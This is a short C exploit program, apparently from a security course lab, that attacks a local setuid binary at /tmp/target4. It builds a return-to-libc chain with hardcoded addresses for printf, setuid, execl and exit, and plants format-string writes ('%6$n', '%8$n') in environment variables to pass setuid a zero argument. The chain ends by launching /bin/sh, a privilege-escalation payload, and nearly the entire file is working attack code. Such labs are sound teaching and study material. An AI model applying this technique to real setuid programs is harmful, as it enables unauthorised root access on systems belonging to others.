#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  //char *env[1];

  // printf 0xb7e52670
  // RET 0x0804855b
  // envvar1 0xbfffffd9
  // printf 0xb7e52670
  // RET 0x0804855b
  // envvar2 0xbfffffe0
  // setuid 0xb7eba2e0
  // placeholder1 0xbffffe20
  // execl 0xb7eb9a80
  // exit 0xb7e379d0
  // envvar3 0xbfffffe7
  // placeholder2 0xbffffe34

  char *result = malloc(8+14*4+1);
  strcat(result, "AAAAAAAA"); // stuff
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xd9\xff\xff\xbf"); // envar1
  strcat(result, "\x70\x26\xe5\xb7"); // printf
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\xe0\xff\xff\xbf"); // envar2
  strcat(result, "\xe0\xa2\xeb\xb7"); // setuid
  strcat(result, "\x5b\x85\x04\x08"); // ret
  strcat(result, "\x20\xfe\xff\xbf"); // placeholder1
  strcat(result, "\x80\x9a\xeb\xb7"); // execl
  strcat(result, "\xd0\x79\xe3\xb7"); // exit
  strcat(result, "\xe7\xff\xff\xbf"); // envar3
  strcat(result, "\xe7\xff\xff\xbf"); // envar3
  strcat(result, "\x34\xfe\xff\xbf"); // placeholder2

  args[0] = TARGET;
  args[1] = result; 
  args[2] = NULL;
  
  char *envp[4] =
    {
        "t=%6$n",
        "j=%8$n",
        "s=/bin/sh",
        NULL
    };

  execve(TARGET, args, envp);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


